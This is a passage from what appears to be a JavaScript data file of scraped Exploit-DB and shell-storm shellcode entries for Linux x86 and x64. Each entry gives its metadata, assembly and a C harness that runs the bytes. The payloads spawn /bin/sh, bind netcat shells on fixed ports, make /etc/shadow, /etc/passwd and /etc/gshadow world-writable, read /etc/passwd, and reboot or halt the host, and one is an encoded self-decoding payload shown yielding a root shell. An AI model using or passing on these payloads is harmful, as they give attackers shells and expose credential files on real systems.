eb 04             \tshr    bl,0x4", " 804809c:\tc1 e0 1c             \tshl    eax,0x1c", " 804809f:\tc1 e8 18             \tshr    eax,0x18", " 80480a2:\t01 d8                \tadd    eax,ebx", " 80480a4:\tb3 ff                \tmov    bl,0xff", " 80480a6:\t28 c3                \tsub    bl,al", " 80480a8:\t88 1f                \tmov    BYTE PTR [edi],bl", " 80480aa:\t47                   \tinc    edi", " 80480ab:\t83 c5 02             \tadd    ebp,0x2", " 80480ae:\teb d0                \tjmp    8048080 <decode_pr>", "", "080480b0 <call_shellcode>:", " 80480b0:\te8 ad ff ff ff       \tcall   8048062 <decoder>", "", "080480b5 <EncodedShellcode>:", " 80480b5:\t43                   \tinc    ebx", " 80480b6:\ted                   \tin     eax,dx", " 80480b7:\t1d f4 40 fb 6f       \tsbb    eax,0x6ffb40f4", " 80480bc:\t7a a9                \tjp     8048067 <decoder+0x5>", " 80480be:\t0e                   \tpush   cs", " 80480bf:\tb6 0e                \tmov    dh,0xe", " 80480c1:\tbc c9 e3 7a af       \tmov    esp,0xaf7ae3c9", " 80480c6:\t7a 78                \tjp     8048140 <EncodedShellcode+0x8b>", " 80480c8:\t0e                   \tpush   cs", " 80480c9:\tc5 da 76             \t(bad)  ", " 80480cc:\t6a 17                \tpush   0x17", " 80480ce:\t1a 4e 68             \tsbb    cl,BYTE PTR [esi+0x68]", " 80480d1:\t38 c2                \tcmp    dl,al", " 80480d3:\t99                   \tcdq    ", " 80480d4:\tfb                   \tsti    ", " 80480d5:\t35 68 84 d2 b3       \txor    eax,0xb3d28468", " 80480da:\tcb                   \tretf   ", " 80480db:\t7c 68                \tjl     8048145 <EncodedShellcode+0x90>", " 80480dd:\t78 e2                \tjs     80480c1 <EncodedShellcode+0xc>", " 80480df:\t9a f5 e9 50 c0 24 91 \tcall   0x9124:0xc050e9f5", " 80480e6:\tf8                   \tclc    ", " 80480e7:\tfe                   \t.byte 0xfe", "-------------------------------------------------------------------------------------------", "", "$ cat shellcode.c", "#include<stdio.h>", "#include<string.h>", "unsigned char code[] =\\", "\"\\xeb\\x4e\\x5e\\x8d\\x3e\\x31\\xc9\\xf7\\xe1\\x31\\xed\\x8a\\x16\\x88\\xd0\\xc0\\xea\\x04\\xc1\\xe0\\x1c\\xc1\\xe8\\x1c\\x28\\xc2\\x79\\x04\\xf6\\xd2\\xfe\\xc2\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x8a\\x44\\x2e\\x01\\x89\\xe9\\x80\\xf1\\x32\\x74\\x24\\x88\\xc1\\x28\\xd1\\x88\\xcb\\x88\\xc8\\xc0\\xeb\\x04\\xc1\\xe0\\x1c\\xc1\\xe8\\x18\\x01\\xd8\\xb3\\xff\\x28\\xc3\\x88\\x1f\\x47\\x83\\xc5\\x02\\xeb\\xd0\\xe8\\xad\\xff\\xff\\xff\\x43\\xed\\x1d\\xf4\\x40\\xfb\\x6f\\x7a\\xa9\\x0e\\xb6\\x0e\\xbc\\xc9\\xe3\\x7a\\xaf\\x7a\\x78\\x0e\\xc5\\xda\\x76\\x6a\\x17\\x1a\\x4e\\x68\\x38\\xc2\\x99\\xfb\\x35\\x68\\x84\\xd2\\xb3\\xcb\\x7c\\x68\\x78\\xe2\\x9a\\xf5\\xe9\\x50\\xc0\\x24\\x91\\xf8\\xfe\";", "", "main()", "{", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "\tint (*ret)() = (int(*)())code;", "\tret();", "}", "-------------------------------------------------------------------------------------------", "", "$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode", "$ ./shellcode", "Shellcode Length:  136", "$whoami ", "root", "$"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Push Method Shellcode (21 bytes)", "Author": "noviceflux", "Published": ": 2015-04-29", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36857.c", "View": "https://old.exploit-db.com/raw/36857/", "code": ["/*", "    #", "    # Execve /bin/sh Shellcode Via Push (Linux x86 21 bytes)", "    #", "    # Dying to be the shortest.", "    #", "    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)", "    #", "    # 18 February 2015", "    #", "    # GPL", "    #", "", "", "    .global _start", "_start:", "    # char *const argv[]", "    xorl %ecx, %ecx", "", "    # 2 bytes, and both %eax and %edx were zeroed", "    mull %ecx", "", "    # __NR_execve 11", "    movb $11, %al", "", "    # for '\\x00'", "    pushl %ecx", "    # 'h' 's' '/' '/'", "    pushl $0x68732f2f", "    # 'n' 'i' 'b' '/'", "    pushl $0x6e69622f", "", "    # const char *filename", "    movl %esp, %ebx", "", "    int $0x80", " */", "", "/*", "  gcc -z execstack -m32 push.c", "", "  uname -r", "  3.19.3-3-ARCH", " */", "", "#include <stdio.h>", "#include <string.h>", "", "int", "main(void)", "{", "  char *shellcode = \"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\"", "    \"\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\";", "", "    printf(\"strlen(shellcode)=%d\\n\", strlen(shellcode));", "", "  ((void (*)(void))shellcode)();", "", "  return 0;", "}"]},
{"Title": "Linux/x64 - execve(/bin/sh) Via Push Shellcode (23 bytes)", "Author": "noviceflux", "Published": ": 2015-04-29", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/36858.c", "View": "https://old.exploit-db.com/raw/36858/", "code": ["/*", "    #", "    # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes)", "    #", "    # Dying to be the shortest.", "    #", "    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)", "    #", "    # 27 April 2015", "    #", "    # GPL", "    #", "", "", "    .global _start", "_start:", "    # char *const argv[]", "    xorl %esi, %esi", "", "    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'", "    movq $0x68732f2f6e69622f, %rbx", "", "    # for '\\x00'", "    pushq %rsi", "", "    pushq %rbx", "", "    pushq %rsp", "    # const char *filename", "    popq %rdi", "", "    # __NR_execve 59", "    pushq $59", "    popq %rax", "", "    # char *const envp[]", "    xorl %edx, %edx", "", "    syscall", " */", "", "/*", "  gcc -z execstack push64.c", "", "  uname -r", "  3.19.3-3-ARCH", " */", "", "#include <stdio.h>", "#include <string.h>", "", "int", "main(void)", "{", "  char *shellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\"", "    \"\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\";", "", "  printf(\"strlen(shellcode)=%d\\n\", strlen(shellcode));", "", "  ((void (*)(void))shellcode)();", "", "  return 0;", "}"]}
]

const pag_3 = [{"Title": "Linux/x86 - exit(0) Shellcode (6 bytes)", "Author": "Febriyanto Nugroho", "Published": ": 2015-05-04", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36908.c", "View": "https://old.exploit-db.com/raw/36908/", "code": ["/*", " * linux/x86 exit(0) - 6 bytes", " * Febriyanto Nugroho", " */ ", "", "#include <stdio.h>", "", "char shellcode[] = \"\\xf7\\xf0\"", "                   \"\\xcd\\x80\"", "                   \"\\xeb\\xfa\";", "", "int main(int argc, char **argv) {", "asm(\"jmp %0;\" : \"=m\" (shellcode));", "}"]},
{"Title": "Linux/x86 - Bind (17771/TCP) Netcat (/bin/nc) Shell (/bin/sh) Shellcode (58 bytes)", "Author": "Oleg Boytsev", "Published": ": 2015-05-06", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-872.php", "View": null, "code": ["/*", "# Linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode", "# This shellcode will listen on port 17771 and give you /bin/sh", "# Shellcode Author: Oleg Boytsev", "# Tested on: Debian GNU/Linux 7/i686", "# Shellcode Length: 58", "# EDB Note ~ Command: gcc -m32 -z execstack x86_Linux_netcat_shellcode.c -o x86_Linux_netcat_shellcode", "", "global _start", "section .text", " _start:", "\txor eax, eax", "\txor edx, edx", "\tpush eax", "\tpush 0x31373737\t\t;-vp17771", "\tpush 0x3170762d", "\tmov esi, esp", "", "\tpush eax", "\tpush 0x68732f2f\t\t;-le//bin//sh", "\tpush 0x6e69622f", "\tpush 0x2f656c2d", "\tmov edi, esp", "", "\tpush eax", "\tpush 0x636e2f2f\t\t;/bin//nc", "\tpush 0x6e69622f", "\tmov ebx, esp", "", "\tpush edx", "\tpush esi", "\tpush edi", "\tpush ebx", "\tmov ecx, esp", "\tmov al,11", "\tint 0x80", "*/", "", "#include<stdio.h>", "#include<string.h>", "", "unsigned char shellcode[] =", "\"\\x31\\xc0\\x31\\xd2\\x50\\x68\\x37\\x37\\x37\\x31\\x68\\x2d\\x76\\x70\\x31\\x89\\xe6\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x68\\x2d\\x6c\\x65\\x2f\\x89\\xe7\\x50\\x68\\x2f\\x2f\\x6e\\x63\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x56\\x57\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "        printf(\"Shellcode Length: %d\\n\",strlen(shellcode));", "        int (*ret)() = (int(*)())shellcode;", "        ret();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (21 bytes) (1)", "Author": "B3mB4m", "Published": ": 2015-06-10", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37251.asm", "View": "https://old.exploit-db.com/raw/37251/", "code": ["Linux/x86 execve /bin/sh shellcode 21 bytes", "", "", "#Greetz : KnocKout,curtis,Bomberman(Leader)", "#Author : B3mB4m", "", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060: 31 c0                 xor    %eax,%eax", " 8048062: 50                    push   %eax", " 8048063: 68 2f 2f 73 68        push   $0x68732f2f", " 8048068: 68 2f 62 69 6e        push   $0x6e69622f", " 804806d: 89 e3                 mov    %esp,%ebx", " 804806f: 89 c2                 mov    %eax,%edx", " 8048071: b0 0b                 mov    $0xb,%al", " 8048073: cd 80                 int    $0x80", "", "", "#include <stdio.h>", "#include <string.h>", " ", "char *shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc2\\xb0\\x0b\\xcd\\x80\";", "", "int main(void){", "  fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "  (*(void(*)()) shellcode)();}", "  ", "# Length: 21 PWNED !"]},
{"Title": "Linux/x86 - chmod 777 /etc/shadow + exit() Shellcode (33 bytes)", "Author": "B3mB4m", "Published": ": 2015-06-15", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37285.txt", "View": "https://old.exploit-db.com/raw/37285/", "code": ["Linux/x86 - chmod() 777 /etc/shadow & exit() - 33 bytes", "", "#Greetz : Bomberman(Leader)", "#Author : B3mB4m", "#Concat : b3mb4m@gmail.com", "", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060:    31 c0                    xor    %eax,%eax", " 8048062:    50                       push   %eax", " 8048063:    68 61 64 6f 77           push   $0x776f6461", " 8048068:    68 63 2f 73 68           push   $0x68732f63", " 804806d:    68 2f 2f 65 74           push   $0x74652f2f", " 8048072:    b0 0f                    mov    $0xf,%al", " 8048074:    89 e3                    mov    %esp,%ebx", " 8048076:    66 b9 ff 01              mov    $0x1ff,%cx", " 804807a:    cd 80                    int    $0x80", " 804807c:    31 c0                    xor    %eax,%eax", " 804807e:    40                       inc    %eax", " 804807f:    cd 80                    int    $0x80", "", "#include <stdio.h>", "#include <string.h>", "", "char *shellcode =", "\"\\x31\\xc0\\x50\\x68\\x61\\x64\\x6f\\x77\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x65\\x74\\xb0\\x0f\\x89\\xe3\\x66\\xb9\\xff\\x01\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";", "", "int main(void){", "    fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();}"]},
{"Title": "Linux/x86 - Shutdown(init 0) Shellcode (30 bytes)", "Author": "B3mB4m", "Published": ": 2015-06-15", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37289.txt", "View": "https://old.exploit-db.com/raw/37289/", "code": ["\u200b\u200bLinux/x86 - Shutdown(init 0) - 30 bytes", "", "#Greetz : Bomberman(Leader)", "#Author : B3mB4m", "", "08048060 <.text>:", "8048060:    31 c0", "8048062:    50", "8048063:    68 68 61 6c 74           push   $0x746c6168", "8048068:    68 69 6e 2f 2f           push   $0x2f2f6e69", "804806d:    68 2f 2f 73 62           push   $0x62732f2f", "8048072:    89 e3", "8048074:    50", "8048075:    89 e2", "8048077:    53", "8048078:    89 e1", "804807a:    b0 0b                    ;execve //sbin//halt", "804807c:    cd 80                    syscall", "", "#include <stdio.h>", "#include <string.h>", "", "char *diebich =", "\"\\x31\\xc0\\x50\\x68\\x68\\x61\\x6c\\x74\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\\x73\\x62\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "int main(void){", "    fprintf(stdout,\"Length: %d\\n\",strlen(diebich));", "    (*(void(*)()) diebich)();}"]},
{"Title": "Linux/x86 - Read /etc/passwd Shellcode (58 bytes)", "Author": "B3mB4m", "Published": ": 2015-06-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37297.txt", "View": "https://old.exploit-db.com/raw/37297/", "code": ["Linux/x86 - /etc/passwd Reader - 58 bytes", "", "#Greetz : Bomberman(Leader),wiremask.eu", "#Author : B3mB4m", "#Concat : Do not disturb - Bomberman", "#Bu adam\u0131 ge\u00e7meden konu\u015fmaya iznim yok.Iki y\u0131l sonra g\u00f6r\u00fc\u015fmek \u00fczre :)", "", "#Info", "#File descriptor on EBX", "#Buffer on ECX", "#Bytes to read on EDX", "", "", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060:    31 c9                    xor    %ecx,%ecx", " 8048062:    31 c0                    xor    %eax,%eax", " 8048064:    31 d2                    xor    %edx,%edx", " 8048066:    51                       push   %ecx", " 8048067:    b0 05                    mov    $0x5,%al", " 8048069:    68 73 73 77 64           push   $0x64777373", " 804806e:    68 63 2f 70 61           push   $0x61702f63", " 8048073:    68 2f 2f 65 74           push   $0x74652f2f", " 8048078:    89 e3                    mov    %esp,%ebx", " 804807a:    cd 80                    int    $0x80", " 804807c:    89 d9                    mov    %ebx,%ecx", " 804807e:    89 c3                    mov    %eax,%ebx", " 8048080:    b0 03                    mov    $0x3,%al", " 8048082:    66 ba ff 0f              mov    $0xfff,%dx", " 8048086:    66 42                    inc    %dx", " 8048088:    cd 80                    int    $0x80", " 804808a:    31 c0                    xor    %eax,%eax", " 804808c:    31 db                    xor    %ebx,%ebx", " 804808e:    b3 01                    mov    $0x1,%bl", " 8048090:    b0 04                    mov    $0x4,%al", " 8048092:    cd 80                    int    $0x80", " 8048094:    31 c0                    xor    %eax,%eax", " 8048096:    b0 01                    mov    $0x1,%al", " 8048098:    cd 80                    int    $0x80", "", "", "#include <stdio.h>", "#include <string.h>", "", "char *shellcode =", "\"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\";", "", "int main(void){", "    fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();}"]},
{"Title": "Linux/x86 - mkdir HACK + chmod 777 + exit(0) Shellcode (29 bytes)", "Author": "B3mB4m", "Published": ": 2015-06-24", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37358.c", "View": "https://old.exploit-db.com/raw/37358/", "code": ["#Greetz : Bomberman(Leader)", "#Author : B3mB4m", "", "", "#Auxiliary tools (50% time gain !)", "#https://github.com/b3mb4m/Shellcode/blob/master/Auxiliary/convertstack.py", "#https://github.com/b3mb4m/Shellcode/blob/master/Auxiliary/ASMtoShellcode.py", "", "", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060:\t31 c0                \txor    %eax,%eax", " 8048062:\t50                   \tpush   %eax", " 8048063:\t68 48 41 43 4b       \tpush   $0x4b434148  #You can change it !", " 8048068:\tb0 27                \tmov    $0x27,%al", " 804806a:\t89 e3                \tmov    %esp,%ebx", " 804806c:\t66 41                \tinc    %cx", " 804806e:\tcd 80                \tint    $0x80", " 8048070:\tb0 0f                \tmov    $0xf,%al", " 8048072:\t66 b9 ff 01          \tmov    $0x1ff,%cx", " 8048076:\tcd 80                \tint    $0x80", " 8048078:\t31 c0                \txor    %eax,%eax", " 804807a:\t40                   \tinc    %eax", " 804807b:\tcd 80                \tint    $0x80", "", "", "#include <stdio.h>", "#include <string.h>", "", "char *shellcode =", "\"\\x31\\xc0\\x50\\x68\\x48\\x41\\x43\\x4b\\xb0\\x27\\x89\\xe3\\x66\\x41\\xcd\\x80\\xb0\\x0f\\x66\\xb9\\xff\\x01\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";", "", "", "//First push always start with byte 68.Also mov b0.", "//Than just push your string between byte 68 - b0 ! :)", "//Here it is -> \\x68   \"\\x48\\x41\\x43\\x4b\\\"    xb0     GOODLUCK !", "", "", "int main(void){", "\tfprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();}"]},
{"Title": "Linux/x86 - Bind (5555/TCP) Netcat Shell Shellcode (60 bytes)", "Author": "B3mB4m", "Published": ": 2015-06-24", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37359.c", "View": "https://old.exploit-db.com/raw/37359/", "code": ["#Greetz : Bomberman(Leader)", "#Author : B3mB4m", "#Concat : Do not disturb - Bomberman", "", "", "#Netcat openbsd version (which is default installed in ubuntu) have not \"-e\" option.", "#So if you are trying to test on ubuntu(like me) you must change version to traditional.", "", "#Typing this:", "\t#1) sudo update-alternatives --config nc", "\t#2) Select the option /bin/nc.traditional", "", "", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060:\t31 c0                \txor    %eax,%eax", " 8048062:\t50                   \tpush   %eax", " 8048063:\t68 6e 2f 6e 63       \tpush   $0x636e2f6e", " 8048068:\t68 2f 2f 62 69       \tpush   $0x69622f2f", " 804806d:\t89 e3                \tmov    %esp,%ebx", " 804806f:\t50                   \tpush   %eax", " 8048070:\t68 35 35 35 35       \tpush   $0x35353535 \t\t#PORT", " 8048075:\t68 2d 6c 74 70       \tpush   $0x70746c2d", " 804807a:\t89 e1                \tmov    %esp,%ecx", " 804807c:\t50                   \tpush   %eax", " 804807d:\t68 2f 2f 73 68       \tpush   $0x68732f2f", " 8048082:\t68 2f 62 69 6e       \tpush   $0x6e69622f", " 8048087:\t68 2d 65 2f 2f       \tpush   $0x2f2f652d", " 804808c:\t89 e2                \tmov    %esp,%edx", " 804808e:\t50                   \tpush   %eax", " 804808f:\t52                   \tpush   %edx", " 8048090:\t51                   \tpush   %ecx", " 8048091:\t53                   \tpush   %ebx", " 8048092:\t89 e7                \tmov    %esp,%edi", " 8048094:\tb0 0b                \tmov    $0xb,%al", " 8048096:\t89 f9                \tmov    %edi,%ecx", " 8048098:\t31 d2                \txor    %edx,%edx", " 804809a:\tcd 80                \tint    $0x80", "", "#include <stdio.h>", "#include <string.h>", "", "char *loveme = \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x6e\\x63\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x68\\x35\\x35\\x35\"", "\t\t\t\t\"\\x35\\x68\\x2d\\x6c\\x74\\x70\\x89\\xe1\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x68\"", "\t\t\t\t\"\\x2d\\x65\\x2f\\x2f\\x89\\xe2\\x50\\x52\\x51\\x53\\x89\\xe7\\xb0\\x0b\\x89\\xf9\\x31\\xd2\\xcd\\x80\";", "", "// \"\\x68-----\\x35\\x35\\x35\\x35\\-------x68\\\"  There port change however you like.", "", "int main(void){", "\tfprintf(stdout,\"Length: %d\\n\",strlen(loveme));", "\t(*(void(*)()) loveme)();}"]},
{"Title": "Linux/x64 - execve(/bin/sh) + Null-Free Shellcode (30 bytes)", "Author": "Bill Borskey", "Published": ": 2015-06-24", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/37362.c", "View": "https://old.exploit-db.com/raw/37362/", "code": ["/*", "William Borskey 2015", "Compile with: gcc -fno-stack-protector -z execstack Shellcode written in 64 bit Intel assembly using yasm.", "", "  1 ; int execve(const char *filename, char *const argv[], char *const envp[]);", "  2 BITS 64", "  3 ", "  4 section .text", "  5         global start", "  6 ", "  7 start:", "  8         mov rcx, 0x1168732f6e69622f ;move the immediate value /bin/sh in hex in ", "  9                                     ;little endian byte order into rcx padded with 11", " 10         shl rcx, 0x08               ;left shift to trim off the two bytes of padding    ", " 11         shr rcx, 0x08               ;ringht shift to re order string", " 12         push rcx                    ;push the immediate value stored in rcx onto the stack", " 13         lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi", " 14         xor rdx, rdx                ;zero out rdx for an execve argument", " 15         mov al, 0x3b                ;move 0x3b (execve sycall) into al to avoid nulls", " 16         syscall                     ;make the syscall", "*/", "", "char shellcode[] = \"\\x48\\xb9\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x11\\x48\\xc1\\xe1\\x08\\x48\\xc1\\xe9\\x08\\x51\\x48\\x8d\\x3c\\x24\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05\";", "", "int main(int argc, char **argv)", "{", "    int (*func)();", "    func = (int (*)()) shellcode;", "    (int)(*func)();", "     return 0;", "}"]},
{"Title": "Linux/x86 - Reboot() Shellcode (28 bytes)", "Author": "B3mB4m", "Published": ": 2015-06-24", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37366.c", "View": "https://old.exploit-db.com/raw/37366/", "code": ["Linux/x86  Reboot - 28Bytes", "", "", "#Greetz : Bomberman(Leader)", "#Author : B3mB4m", "#Tested ON : Ubuntu 14.04", "", "", "08048060 <.text>:", " 8048060:\t31 c0                \txor    %eax,%eax", " 8048062:\t50                   \tpush   %eax", " 8048063:\t68 62 6f 6f 74       \tpush   $0x746f6f62", " 8048068:\t68 6e 2f 72 65       \tpush   $0x65722f6e", " 804806d:\t68 2f 73 62 69       \tpush   $0x6962732f", " 8048072:\t89 e3                \tmov    %esp,%ebx", " 8048074:\t50                   \tpush   %eax", " 8048075:\t53                   \tpush   %ebx", " 8048076:\t89 e1                \tmov    %esp,%ecx", " 8048078:\tb0 0b                \tmov    $0xb,%al", " 804807a:\tcd 80                \tint    $0x80", "", "", "", "#include <stdio.h>", "#include <string.h>", "", "char *shellcode = \"\\x31\\xc0\\x50\\x68\\x62\\x6f\\x6f\\x74\\x68\\x6e\\x2f\\x72\\x65\"", "\"\\x68\\x2f\\x73\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "", "int main(void){", "\tfprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (23 bytes) (1)", "Author": "Bill Borskey", "Published": ": 2015-06-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37384.c", "View": "https://old.exploit-db.com/raw/37384/", "code": ["/*", "Compile with: gcc -fno-stack-protector -z execstack", "23 byte execve shellcode", "  2 ; int execve(const char *filename, char *const argv[], char *const envp[]);", "  3 BITS 64", "  4 ", "  5 section .text", "  6         global start", "  7 ", "  8 start:", "  9         xor rdx, rdx                ;zero out rdx", " 10         push rdx                    ;push rdx to stack to null terminate /bin//sh       ", " 11         mov al, 0x3b                ;move 3b into al for execve", " 12         mov rcx, 0x68732f2f6e69622f ;move the immediate value /bin//sh in hex in rcx ", " 13         push rcx                    ;push the immediate value stored in rcx onto the stack", " 14         lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi", " 15         syscall                     ;make the syscall ", "*/", "", "char shellcode[] = \"\\x48\\x31\\xd2\\x52\\xb0\\x3b\\x48\\xb9\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x51\\x48\\x8d\\x3c\\x24\\x0f\\x05\";", "", "int main(int argc, char **argv)", "{", "    int (*func)();", "    func = (int (*)()) shellcode;", "    (int)(*func)();", "     return 0;", "}"]},
{"Title": "Linux/x86 - chmod 0777 /etc/passwd Shellcode (42 bytes)", "Author": "Mohammad Reza Espargham", "Published": ": 2015-06-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37390.asm", "View": "https://old.exploit-db.com/raw/37390/", "code": ["/*", "# Title: Linux/x86 chmod('/etc/passwd',0777) - shellcode 42 bytes", "# Platform: linux/x86_64", "# Author: Mohammad Reza Espargham", "#    Linkedin    :   https://ir.linkedin.com/in/rezasp", "#    E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com", "#    Website     :   www.reza.es", "#    Twitter     :   https://twitter.com/rezesp", "#    FaceBook    :   https://www.facebook.com/mohammadreza.espargham", "", "", " Disassembly of section .text:", " ", " ", " 00000000 <.text>:", " 0:    6a 0f                    push   $0xf", " 2:    58                       pop    %eax", " 3:    68 90 90 ff 01           push   $0x1ff9090", " 8:    59                       pop    %ecx", " 9:    c1 e9 10                 shr    $0x10,%ecx", " c:    68 90 73 77 64           push   $0x64777390", " 11:    5b                       pop    %ebx", " 12:    c1 eb 08                 shr    $0x8,%ebx", " 15:    53                       push   %ebx", " 16:    68 2f 70 61 73           push   $0x7361702f", " 1b:    68 2f 65 74 63           push   $0x6374652f", " 20:    89 e3                    mov    %esp,%ebx", " 22:    cd 80                    int    $0x80", " 24:    b0 01                    mov    $0x1,%al", " 26:    b3 01                    mov    $0x1,%bl", " 28:    cd 80                    int    $0x80", " */", "", "#include <stdio.h>", "#include <string.h>", "int main(){", "unsigned char shellcode[]= \"\\x6a\\x0f\\x58\\x68\\x90\\x90\\xff\\x01\\x59\\xc1\\xe9\\x10\\x68\\x90\\x73\\x77\\x64\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x70\\x61\\x73\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\xcd\\x80\\xb0\\x01\\xb3\\x01\\xcd\\x80\";", "fprintf(stdout,\"Length: %d\\n\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - chmod /etc/gshadow Shellcode (37 bytes)", "Author": "Mohammad Reza Espargham", "Published": ": 2015-06-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37391.asm", "View": "https://old.exploit-db.com/raw/37391/", "code": ["/*", "# Title: Linux/x86 chmod('/etc/gshadow') - shellcode 37 bytes", "# Platform: linux/x86_64", "# Author: Mohammad Reza Espargham", "#    Linkedin    :   https://ir.linkedin.com/in/rezasp", "#    E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com", "#    Website     :   www.reza.es", "#    Twitter     :   https://twitter.com/rezesp", "#    FaceBook    :   https://www.facebook.com/mohammadreza.espargham", "", "", " Disassembly of section .text:", " ", " 00000000 <.text>:", " 0:    6a 0f                    push   $0xf", " 2:    58                       pop    %eax", " 3:    68 90 90 ff 01           push   $0x1ff9090", " 8:    59                       pop    %ecx", " 9:    c1 e9 10                 shr    $0x10,%ecx", " c:    68 61 64 6f 77           push   $0x776f6461", " 11:    68 2f 67 73 68           push   $0x6873672f", " 16:    68 2f 65 74 63           push   $0x6374652f", " 1b:    89 e3                    mov    %esp,%ebx", " 1d:    cd 80                    int    $0x80", " 1f:    b0 01                    mov    $0x1,%al", " 21:    b3 01                    mov    $0x1,%bl", " 23:    cd 80                    int    $0x80", " */", "", "#include <stdio.h>", "#include <string.h>", "int main(){", "unsigned char shellcode[]= \"\\x6a\\x0f\\x58\\x68\\x90\\x90\\xff\\x01\\x59\\xc1\\xe9\\x10\\x68\\x61\\x64\\x6f\\x77\\x68\\x2f\\x67\\x73\\x68\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\xcd\\x80\\xb0\\x01\\xb3\\x01\\xcd\\x80\";", "fprintf(stdout,\"Length: %d\\n\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - chmod 0777 /etc/shadow Shellcode (42 bytes)", "Author": "Mohammad Reza Espargham", "Published": ": 2015-06-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37392.asm", "View": "https://old.exploit-db.com/raw/37392/", "code": ["/*", "# Title: Linux/x86 chmod('/etc/shadow','0777') - shellcode 42 bytes", "# Platform: linux/x86_64", "# Date: 2015-06-15", "# Author: Mohammad Reza Espargham", "#    Linkedin    :   https://ir.linkedin.com/in/rezasp", "#    E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com", "#    Website     :   www.reza.es", "#    Twitter     :   https://twitter.com/rezesp", "#    FaceBook    :   https://www.facebook.com/mohammadreza.espargham", "", "", "00000000 <.text>:", "   0:\t6a 0f                \tpush   $0xf", "   2:\t58                   \tpop    %eax", "   3:\t68 90 90 ff 01       \tpush   $0x1ff9090", "   8:\t59                   \tpop    %ecx", "   9:\tc1 e9 10             \tshr    